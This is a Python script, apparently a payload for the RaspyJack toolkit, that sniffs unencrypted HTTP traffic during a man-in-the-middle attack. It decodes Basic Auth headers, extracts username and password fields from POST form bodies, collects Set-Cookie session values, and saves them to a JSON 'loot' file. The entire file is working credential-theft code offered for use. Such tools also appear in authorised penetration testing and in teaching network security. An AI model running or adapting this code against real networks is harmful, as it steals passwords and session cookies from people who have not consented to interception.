#!/usr/bin/env python3
# @name: Passive HTTP Credential Extractor
# @desc: Runs during active MITM.
# @category: credentials
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- Passive HTTP Credential Extractor
======================================================
Author: 7h30th3r0n3

Runs during active MITM.  Uses scapy to sniff TCP port 80 traffic and
extracts HTTP Basic Auth headers, POST form data with credential fields,
and Set-Cookie headers.

Controls:
  python3 http_cred_sniffer.py [iface] [duration_seconds]

  iface             -- network interface to sniff on (default: eth0)
  duration_seconds  -- stop automatically after N seconds (default: run
                        until Ctrl-C)

  Captured credentials are printed as they are found and exported to
  loot when sniffing stops.

Loot: $CITYPOP_ROOT/loot/HTTPCreds/http_creds_YYYYMMDD_HHMMSS.json
"""

import os
import sys
import json
import time
import base64
import threading
import re
from datetime import datetime
from urllib.parse import unquote_plus

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

try:
    from scapy.all import sniff as scapy_sniff, TCP, Raw, IP
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

LOOT_DIR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'loot', 'HTTPCreds')

# Credential field names to search in POST bodies
CRED_FIELDS = re.compile(
    r"(user(?:name)?|login|email|pass(?:word)?|passwd|pwd|credential)"
    r"=([^&\r\n]+)",
    re.IGNORECASE,
)

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
running = True
sniffing = False

captured = []       # [{"type", "src", "dst", "data", "time"}]
total_packets = 0
sniffer_thread = None


# ---------------------------------------------------------------------------
# Packet processing
# ---------------------------------------------------------------------------

def _decode_basic_auth(header_value):
    """Decode a Basic auth header value. Returns (user, pass) or None."""
    try:
        encoded = header_value.strip()
        decoded = base64.b64decode(encoded).decode("utf-8", errors="replace")
        if ":" in decoded:
            user, passwd = decoded.split(":", 1)
            return (user, passwd)
    except Exception:
        pass
    return None


def _extract_form_creds(body):
    """Extract credential fields from a URL-encoded POST body."""
    pairs = {}
    for match in CRED_FIELDS.finditer(body):
        field = match.group(1).lower()
        value = unquote_plus(match.group(2))
        pairs[field] = value
    return pairs if pairs else None


def _extract_cookies(header_lines):
    """Extract Set-Cookie values from HTTP response headers."""
    cookies = []
    for line in header_lines:
        if line.lower().startswith("set-cookie:"):
            cookie_val = line.split(":", 1)[1].strip()
            cookies.append(cookie_val[:100])
    return cookies


def _process_packet(pkt):
    """Process a single captured packet for credential data."""
    global total_packets

    if not pkt.haslayer(Raw) or not pkt.haslayer(TCP) or not pkt.haslayer(IP):
        return

    with lock:
        total_packets += 1

    try:
        payload = pkt[Raw].load.decode("utf-8", errors="replace")
    except Exception:
        return

    src_ip = pkt[IP].src
    dst_ip = pkt[IP].dst
    timestamp = datetime.now().strftime("%H:%M:%S")
    lines = payload.split("\r\n")

    # Check for Basic Auth header
    for line in lines:
        if line.lower().startswith("authorization: basic "):
            b64_part = line.split(" ", 2)[-1]
            decoded = _decode_basic_auth(b64_part)
            if decoded:
                entry = {
                    "type": "BasicAuth",
                    "src": src_ip,
                    "dst": dst_ip,
                    "data": f"{decoded[0]}:{decoded[1]}",
                    "time": timestamp,
                }
                with lock:
                    captured.append(entry)
                print(f"[{timestamp}] BasicAuth {src_ip} -> {dst_ip} "
                      f"{entry['data']}", flush=True)
                return

    # Check for POST form credentials
    if lines and lines[0].upper().startswith("POST "):
        # Body is after the blank line
        body_start = payload.find("\r\n\r\n")
        if body_start >= 0:
            body = payload[body_start + 4:]
            creds = _extract_form_creds(body)
            if creds:
                data_str = " ".join(f"{k}={v}" for k, v in creds.items())
                entry = {
                    "type": "POST",
                    "src": src_ip,
                    "dst": dst_ip,
                    "data": data_str[:120],
                    "time": timestamp,
                }
                with lock:
                    captured.append(entry)
                print(f"[{timestamp}] POST {src_ip} -> {dst_ip} "
                      f"{entry['data']}", flush=True)
                return

    # Check for Set-Cookie in responses
    cookies = _extract_cookies(lines)
    if cookies:
        for cookie in cookies[:3]:
            entry = {
                "type": "Cookie",
                "src": src_ip,
                "dst": dst_ip,
                "data": cookie[:80],
                "time": timestamp,
            }
            with lock:
                captured.append(entry)
            print(f"[{timestamp}] Cookie {src_ip} -> {dst_ip} "
                  f"{entry['data']}", flush=True)


# ---------------------------------------------------------------------------
# Sniffer thread
# ---------------------------------------------------------------------------

def _sniffer_thread_fn(iface):
    """Run scapy sniffer in a background thread."""
    global sniffing
    try:
        scapy_sniff(
            iface=iface,
            filter="tcp port 80",
            prn=_process_packet,
            store=False,
            stop_filter=lambda _pkt: not sniffing or not running,
        )
    except Exception as exc:
        print(f"[!] Sniff error: {exc}", flush=True)
    sniffing = False


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_loot():
    """Write captured credentials to JSON loot file."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filepath = os.path.join(LOOT_DIR, f"http_creds_{ts}.json")
    with lock:
        data = {
            "timestamp": ts,
            "total_packets": total_packets,
            "credentials": list(captured),
        }
    with open(filepath, "w") as fh:
        json.dump(data, fh, indent=2)
    return filepath


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global running, sniffing, sniffer_thread

    if "-h" in sys.argv or "--help" in sys.argv:
        print("Usage: python3 http_cred_sniffer.py [iface] [duration_seconds]", flush=True)
        return 0

    if not SCAPY_OK:
        print("[!] scapy not found. Install it with: pip install scapy", flush=True)
        return 1

    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    duration = None
    if len(sys.argv) > 2:
        try:
            duration = float(sys.argv[2])
        except ValueError:
            print(f"[!] Invalid duration: {sys.argv[2]}", flush=True)
            return 1

    print(f"[*] Passive HTTP credential extractor starting on {iface}", flush=True)
    if duration:
        print(f"[*] Will stop automatically after {duration:.0f}s (Ctrl-C to stop early)", flush=True)
    else:
        print("[*] Press Ctrl-C to stop.", flush=True)

    sniffing = True
    sniffer_thread = threading.Thread(target=_sniffer_thread_fn, args=(iface,), daemon=True)
    sniffer_thread.start()

    start_time = time.time()
    last_report = 0.0

    try:
        while running:
            time.sleep(0.5)
            elapsed = time.time() - start_time

            if elapsed - last_report >= 5:
                last_report = elapsed
                with lock:
                    total = len(captured)
                    pkts = total_packets
                print(f"[*] {elapsed:.0f}s elapsed, {pkts} packets seen, "
                      f"{total} credential(s) captured", flush=True)

            if duration and elapsed >= duration:
                break

            if not sniffing:
                # Sniffer thread exited on its own (e.g. iface error).
                break
    except KeyboardInterrupt:
        print("\n[*] Stopping...", flush=True)
    finally:
        running = False
        sniffing = False
        if sniffer_thread and sniffer_thread.is_alive():
            sniffer_thread.join(timeout=3)

        with lock:
            total = len(captured)
            pkts = total_packets

        print(f"[*] Sniffing stopped. {pkts} packets seen, "
              f"{total} credential(s) captured.", flush=True)

        if total:
            path = _export_loot()
            print(f"[*] Exported to {path}", flush=True)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
